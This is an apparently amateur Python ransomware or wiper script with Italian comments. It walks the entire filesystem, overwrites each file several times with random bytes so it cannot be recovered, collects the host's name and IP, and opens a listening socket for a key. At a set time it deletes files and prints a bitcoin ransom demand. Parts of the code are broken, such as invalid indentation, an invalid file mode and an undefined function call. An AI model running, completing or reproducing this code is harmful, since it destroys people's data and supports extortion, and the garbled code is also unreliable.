from datetime import datetime
import time
import socket
import os 
import socket
import subprocess
import shutil
        passo=4
        conta=0 
        """percorso=os.path.join(os.path.expanduser("~"),"C:\\")#mostra il percoso nella directori  Desktop  
        print(percorso)"""
        for root, dirs,files in os.walk("/"):
            for  file in files:
                time.sleep(0)
                file=os.path.join(root, file)
                try:
                    # Sovrascrive il contenuto del file con dati casuali per renderlo irrecuperabile
                    with  open(file,"r+b") as f:
                        for passo1 in range(passo):
                            f.seek(0) # Torna all'inizio del file
                            lettera=os.path.getsize(file) # Ottiene la dimensione del file
                            f.write(os.urandom(lettera)) # Scrive dati casuali per la dimensione del file
                            conta+=1
                            print(file)
                except:     
                    print(f"comando non eseguito: {file}")
"""import pyautogui
from  scapy.config import conf"""
#from wifi import Cell, Schermo
nomep=socket.gethostname()
comprleto=socket.gethostbyname(nomep)
print(comprleto)
from cryptography.fernet import Fernet
chiave=Fernet.generate_key()
#subprocess.Popen("notepad.exe")
test="FEfefe"
def dati_set():
    nomep=socket.gethostname()
    comprleto=socket.gethostbyname(nomep)
    tutto=socket.gethostbyaddr(nomep)
    print(comprleto)
    print(nomep)
    print(tutto)
    file=open("dati.txt","w")
    file.write(str(tutto))
    file.write(str(comprleto))
    data_set()
def invia_key():
    io=socket.socket()
    io.bind(("12.0.0.1",8900))
    try:
        print(f"print server in attersa {io}")
        caccca,possa=io.accept()
        print(f"sei conesso a {possa}")
        dati=caccca.recv(1024)
        caccca.send(dati)
        print(f"all aprossiama")
    except NameError as name:
        print(f"errore{name}")
while True:
    orariopc=datetime.now().strftime("%H/%M")
    print(f"orario {orariopc}")
    if orariopc =="22/51":
        for rooty,cart,files in os.walk("/"):
            for file in files:
                tuttifile=os.path.join(rooty, file)
                with open(tuttifile,"wr") as file:
                    file.writelines(Fernet(chiave))
                print("consegna tua madre nel conto btc:347654375")
                try:
                    os.remove(tuttifile)  
                except :
                    print(f"file eliminati {tuttifile}")

